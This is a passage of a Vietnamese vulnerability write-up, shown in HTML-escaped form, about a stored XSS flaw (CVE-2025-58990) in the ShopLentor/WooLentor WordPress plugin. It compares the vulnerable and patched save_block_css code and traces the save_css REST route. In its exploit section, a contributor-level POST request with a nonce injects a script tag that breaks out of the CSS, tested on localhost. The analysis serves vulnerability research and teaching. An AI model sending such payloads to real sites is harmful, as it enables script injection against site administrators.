plugin bắt buộc &lt;strong&gt;actived&lt;/strong&gt; trước khi cài &lt;strong&gt;ShopLentor Plugin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở file &lt;strong&gt;woolentor-blocks/includes/classes/Manage_Styles.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // Không kiểm tra quyền user&#xA;    // Không lọc nội dung CSS trước khi lưu&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $params[&amp;#39;block_css&amp;#39;] );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $params[&amp;#39;block_css&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    $params &#x9;= $request-&amp;gt;get_params();&#xA;    $post_id = sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;&#xA;    // Chỉ admin hoặc tác giả bài viết mới được phép&#xA;    $post = get_post( $post_id );&#xA;    if ( ! $post || ( ! current_user_can(&amp;#39;manage_options&amp;#39;) &amp;amp;&amp;amp;&#xA;        get_current_user_id() !== (int) $post-&amp;gt;post_author ) ) {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false, &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;No permission&amp;#39;)];&#xA;    }&#xA;&#xA;    // Lọc dữ liệu trước khi lưu&#xA;    $block_css = $this-&amp;gt;sanitize_css_content( $params[&amp;#39;block_css&amp;#39;] );&#xA;    update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $block_css );&#xA;    $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $block_css );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá dùng &lt;code&gt;current_user_can(manage_options)&lt;/code&gt; để kiểm tra có phải &lt;strong&gt;admin&lt;/strong&gt; không&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu user là &lt;strong&gt;admin&lt;/strong&gt; =&amp;gt; vế đầu &lt;code&gt;! current_user_can(&#39;manage_options&#39;) = false&lt;/code&gt; =&amp;gt; cả biểu thức &lt;code&gt;&amp;amp;&amp;amp; = false&lt;/code&gt; =&amp;gt; qua được.&lt;/li&gt;&#xA;&lt;li&gt;Nếu user là &lt;strong&gt;author&lt;/strong&gt; =&amp;gt; vế sau &lt;code&gt;get_current_user_id() !== (int) $post-&amp;gt;post_author = false&lt;/code&gt; =&amp;gt; cả biểu thức &lt;code&gt;&amp;amp;&amp;amp; = false&lt;/code&gt; =&amp;gt; qua được.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/patch_diff.png&#34;&#xA;    alt=&#34;Patch Diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch Diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How It Work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function save_block_css( $request ){&#xA;    try{&#xA;        global $wp_filesystem;&#xA;        if ( ! $wp_filesystem || !function_exists(&amp;#39;WP_Filesystem&amp;#39;) ) {&#xA;            require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;        }&#xA;&#xA;        $params &#x9;= $request-&amp;gt;get_params();&#xA;        $post_id &#x9;= sanitize_text_field( $params[&amp;#39;post_id&amp;#39;] );&#xA;        &#xA;        if ( $post_id == &amp;#39;woolentor-widget&amp;#39; &amp;amp;&amp;amp; $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_option( $post_id, $params[&amp;#39;block_css&amp;#39;] );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true, &#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Widget CSS Saved.&amp;#39;, &amp;#39;woolentor&amp;#39;)&#xA;            ];&#xA;        }&#xA;&#xA;        $filename &#x9;&#x9;= &amp;#34;woolentor-css-{$post_id}.css&amp;#34;;&#xA;        $upload_dir_url = wp_upload_dir();&#xA;        $dirname &#x9;&#x9;= trailingslashit( $upload_dir_url[&amp;#39;basedir&amp;#39;] ) . &amp;#39;woolentor-addons/&amp;#39;;&#xA;&#xA;        if ( $params[&amp;#39;has_block&amp;#39;] ) {&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;            $all_block_css = $params[&amp;#39;block_css&amp;#39;];&#xA;&#xA;            WP_Filesystem( false, $upload_dir_url[&amp;#39;basedir&amp;#39;], true );&#xA;            if( ! $wp_filesystem-&amp;gt;is_dir( $dirname ) ) {&#xA;                $wp_filesystem-&amp;gt;mkdir( $dirname );&#xA;            }&#xA;&#xA;            update_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39;, $all_block_css );&#xA;            if ( ! $wp_filesystem-&amp;gt;put_contents( $dirname . $filename, $all_block_css ) ) {&#xA;                throw new \Exception( __(&amp;#39;You are not permitted to save CSS.&amp;#39;, &amp;#39;woolentor&amp;#39; ) ); &#xA;            }&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt;__(&amp;#39;WooLentor Blocks css file update.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        } else {&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_active&amp;#39; );&#xA;            if ( file_exists( $dirname.$filename ) ) {&#xA;                wp_delete_file( $dirname.$filename );&#xA;            }&#xA;            delete_post_meta( $post_id, &amp;#39;_woolentor_css&amp;#39; );&#xA;            return [&#xA;                &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;WooLentor Blocks CSS Delete.&amp;#39;, &amp;#39;woolentor&amp;#39; )&#xA;            ];&#xA;        }&#xA;    } catch( \Exception $e ){&#xA;        return [&#xA;            &amp;#39;success&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $e-&amp;gt;getMessage()&#xA;        ];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;save_block_css()&lt;/code&gt; thuộc class &lt;code&gt;Manage_Styles&lt;/code&gt; có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block.&lt;/p&gt;&#xA;&lt;p&gt;Ứng dụng sẽ lấy &lt;code&gt;post_id&lt;/code&gt; và nội dung &lt;code&gt;block_css&lt;/code&gt; từ request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trường hợp đặc biệt&lt;/strong&gt;: nếu &lt;code&gt;post_id = woolentor-widget&lt;/code&gt; =&amp;gt; lưu CSS vào &lt;code&gt;wp_options&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trường hợp bài viết thường&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu có block (&lt;code&gt;has_block = true&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đánh dấu post đang active (&lt;code&gt;_woolentor_active&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Lưu CSS vào bảng &lt;code&gt;wp_postmeta&lt;/code&gt; với &lt;code&gt;meta_key&lt;/code&gt; là &lt;code&gt;_woolentor_css&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_postmeta where meta_key=&amp;#39;_woolentor_css&amp;#39;;&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;| meta_id | post_id | meta_key       | meta_value |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&#xA;|      27 |      69 | _woolentor_css | body:{}    |&#xA;|     687 |    1416 | _woolentor_css | body:{}    |&#xA;&amp;#43;---------&amp;#43;---------&amp;#43;----------------&amp;#43;------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ghi CSS ra file trong thư mục upload (&lt;code&gt;woolentor-css-{post_id}.css&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/write_css.png&#34;&#xA;      alt=&#34;Write CSS&#34;&gt;&lt;figcaption&gt;&#xA;        &lt;p&gt;Write CSS&lt;/p&gt;&#xA;      &lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Nếu không có block (&lt;code&gt;has_block = false&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Xoá trạng thái active và CSS meta.&lt;/li&gt;&#xA;&lt;li&gt;Xoá file CSS nếu tồn tại.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Khả năng xảy ra là combo &lt;strong&gt;Stored XSS&lt;/strong&gt; phổ biến trong plugin WordPress: user role &lt;strong&gt;contributor&lt;/strong&gt; (không có quyền publish) tạo post có CSS chứa payload XSS. Payload này được lưu trong &lt;strong&gt;database&lt;/strong&gt; hoặc một &lt;strong&gt;file&lt;/strong&gt;; Người dùng có đặc quyền cao hơn sẽ preview (xem trước) nội dung trước khi publish, payload sẽ được tải/hiển thị trong trình duyệt và thực thi, gây ra XSS.&lt;/p&gt;&#xA;&lt;p&gt;Để hiểu cách dữ liệu được hiển thị, ta tìm với từ khóa &lt;code&gt;_woolentor_css&lt;/code&gt; trong thư mục plugin. Vì CSS được lưu trong &lt;code&gt;wp_postmeta&lt;/code&gt; với &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt;, nên chắc chắn plugin sẽ truy vấn giá trị này và chèn trực tiếp vào HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/meta_key.png&#34;&#xA;    alt=&#34;Search Meta Key&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search Meta Key&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;generate_inline_css()&lt;/code&gt; lấy block CSS từ &lt;strong&gt;wp_postmeta&lt;/strong&gt; với &lt;code&gt;meta_key = _woolentor_css&lt;/code&gt; và lấy từ file &lt;code&gt;woolentor-css-{$post_id}.css&lt;/code&gt;, nếu file tồn tại thì &lt;code&gt;get_contents&lt;/code&gt; và inline CSS cho post có &lt;code&gt;$post_id&lt;/code&gt; được truyền vào, còn nếu file không tồn tại thì lấy từ &lt;strong&gt;wp_postmeta&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nội dung được đặt trong thẻ &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;class &lt;code&gt;Manage_Styles&lt;/code&gt; đăng ký &lt;strong&gt;REST API&lt;/strong&gt; trong hàm &lt;code&gt;register_routes&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes( $namespace ){&#xA;    register_rest_route( $namespace, &amp;#39;save_css&amp;#39;,&#xA;        [&#xA;            [&#xA;                &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;, &#xA;                &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;save_block_css&amp;#39; ],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; [ $this, &amp;#39;permission_check&amp;#39; ],&#xA;                &amp;#39;args&amp;#39; =&amp;gt; []&#xA;            ]&#xA;        ]&#xA;    );&#xA;    // other route&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;register_rest_route()&lt;/code&gt; tạo một &lt;strong&gt;REST API&lt;/strong&gt; endpoint tại đường dẫn:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/{namespace}/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có request &lt;strong&gt;POST&lt;/strong&gt; tới endpoint này:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;WordPress sẽ gọi hàm &lt;code&gt;save_block_css()&lt;/code&gt; để xử lý dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Trước đó, &lt;code&gt;permission_callback&lt;/code&gt; sẽ chạy hàm &lt;code&gt;permission_check()&lt;/code&gt; để kiểm tra quyền của user (nếu trả về false thì chặn request).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function permission_check() {&#xA;    if( current_user_can( &amp;#39;edit_posts&amp;#39; ) ){&#xA;        return true;&#xA;    }else{&#xA;        return false;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;permission_check&lt;/code&gt; quy định rằng chỉ những user có quyền &lt;strong&gt;contributor&lt;/strong&gt; trở lên mới được phép sử dụng API này.&lt;/p&gt;&#xA;&lt;p&gt;Ta chưa xác định được chính xác &lt;strong&gt;namespace&lt;/strong&gt; ở đây là gì vì nó được khai báo ở đâu đó trong mã nguồn, không phải trong class này. Ta tận dụng route &lt;code&gt;save_css&lt;/code&gt; để truy vết.&lt;/p&gt;&#xA;&lt;p&gt;Truy cập &lt;code&gt;/wp-json/&lt;/code&gt; và tìm với từ khóa &lt;code&gt;save_css&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/search.png&#34;&#xA;    alt=&#34;Search&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Kết quả cho thấy endpoint thực tế là:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Để biết &lt;strong&gt;namespace&lt;/strong&gt; này được khai báo ở đâu, ta tiếp tục tìm trong mã nguồn với từ khóa &lt;code&gt;&#39;woolentor/v1&#39;&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/name_space.png&#34;&#xA;    alt=&#34;Name Space&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Name Space&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Có nhiều kết quả, nhưng vì ta đang phân tích tính năng &lt;strong&gt;REST API&lt;/strong&gt;, nên tập trung vào file &lt;strong&gt;Api.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;register_routes( $namespace )&lt;/code&gt; thuộc class &lt;code&gt;Manage_Styles&lt;/code&gt; yêu cầu tham số &lt;code&gt;$namespace&lt;/code&gt; nên có thể &lt;code&gt;woolentor/v1&lt;/code&gt; được truyền ở đây thông qua thể hiện của class gọi đến hàm. ta tìm với từ khóa &lt;code&gt;Manage_Styles&lt;/code&gt; trong file &lt;strong&gt;Api.php&lt;/strong&gt; để biết nó được gọi như vậy không.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/callapi.png&#34;&#xA;    alt=&#34;Call Api&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Call Api&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;namespace&lt;/code&gt; chính xác được gọi và truyền như vậy.&lt;/p&gt;&#xA;&lt;p&gt;👉 Như vậy, khi gửi &lt;strong&gt;POST&lt;/strong&gt; request đến endpoint &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt;, callback &lt;code&gt;save_block_css&lt;/code&gt; được gọi để thêm/sửa block CSS trong file và database.&#xA;Khi truy cập vào post có &lt;code&gt;post_id&lt;/code&gt; liên quan đến block CSS được lưu, &lt;code&gt;generate_inline_css&lt;/code&gt; sẽ lấy nội block CSS và inline CSS trong thẻ &lt;code&gt;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;&amp;lt;/style&amp;gt;&lt;/code&gt; của post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Sử dụng user có role &lt;strong&gt;contributor&lt;/strong&gt; tạo 1 post bất kì, ghi nhớ id của post đó.&lt;/p&gt;&#xA;&lt;p&gt;Gửi &lt;strong&gt;POST&lt;/strong&gt; request đến endpoint &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt; với XSS payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;    &amp;#34;code&amp;#34;:&amp;#34;rest_forbidden&amp;#34;,&#xA;    &amp;#34;message&amp;#34;:&amp;#34;Sorry, you are not allowed to do that.&amp;#34;,&#xA;    &amp;#34;data&amp;#34;:{&#xA;        &amp;#34;status&amp;#34;:401&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Thiếu header &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; để phân quyền người dùng. Ta mở source HTML (&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;U&lt;/kbd&gt;) trang chỉnh sửa bài viết:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;view-source:http://localhost/wp-admin/post.php?post=&amp;lt;post_id&amp;gt;&amp;amp;action=edit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tìm &lt;code&gt;wpApiSettings&lt;/code&gt; trong source và lấy giá trị &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/api_search.png&#34;&#xA;    alt=&#34;wpApiSettings&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;wpApiSettings&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Gửi request với &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; có giá trị vừa lấy được&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;X-WP-Nonce: f79ec79e4b&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Preview post&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/preview.png&#34;&#xA;    alt=&#34;Preview&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Preview&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 XSS thành công, &lt;strong&gt;inspect&lt;/strong&gt; để xem code được thay đổi như nào&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;View source code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/code.png&#34;&#xA;    alt=&#34;Code&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 